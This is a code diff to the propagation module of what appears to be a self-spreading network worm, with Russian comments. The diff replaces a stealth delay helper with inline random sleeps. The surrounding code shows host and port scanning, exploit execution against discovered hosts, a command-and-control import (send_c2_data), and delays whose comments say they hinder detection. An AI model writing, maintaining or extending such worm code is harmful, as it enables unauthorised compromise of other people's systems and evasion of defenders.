@@ -13,9 +13,7 @@ from exploit_engine import ExploitEngine
 from vulnerability_scanner import VulnerabilityScanner
 from src.exploit_manager import ExploitManager
 from comms.comms import send_c2_data
-from stealth.stealth import random_delay
 from queue import Queue, Empty
-from src.common.utils import scan_network, is_host_reachable
 
 # Настройка логирования
 logger = logging.getLogger('WormPropagation')
@@ -120,7 +118,7 @@ class PropagationEngine:
                     ip_str = host_queue.get(block=False)
                     # Случайная задержка для усложнения обнаружения
                     if self.config['random_delay']:
-                        random_delay(max_delay=0.5)
+                        time.sleep(random.uniform(0, 0.5))
                         
                     # Ping или проверка портов
                     if quick:
@@ -189,7 +187,7 @@ class PropagationEngine:
             try:
                 # Случайная задержка
                 if self.config['random_delay']:
-                    random_delay(max_delay=0.2)
+                    time.sleep(random.uniform(0, 0.2))
                     
                 with socket.create_connection((host, port), timeout=self.config['timeout']):
                     # Определяем сервис
@@ -304,7 +302,7 @@ class PropagationEngine:
                     
                     # Устанавливаем случайную задержку после успешной эксплуатации
                     if self.config['random_delay']:
-                        random_delay(min_delay=1, max_delay=5)
+                        time.sleep(random.uniform(1, 5))
                 
             except Exception as e:
                 logger.error(f"Error executing exploit {exploit['exploit_id']} on {host}: {e}", exc_info=True)
